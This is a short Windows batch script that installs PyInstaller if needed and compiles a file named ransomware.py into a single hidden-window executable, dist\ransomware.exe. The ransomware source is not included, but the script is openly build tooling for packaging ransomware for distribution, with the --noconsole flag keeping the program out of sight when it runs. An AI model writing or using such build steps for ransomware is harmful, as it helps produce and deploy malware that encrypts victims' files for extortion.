@echo off
echo Building ransomware executable...
echo.

REM Check if pyinstaller is installed
pip show pyinstaller >nul 2>&1
if errorlevel 1 (
    echo Installing pyinstaller...
    pip install pyinstaller
)

REM Build the executable
pyinstaller --onefile --noconsole ransomware.py

echo.
echo Done! Executable is in: dist\ransomware.exe
echo.
pause
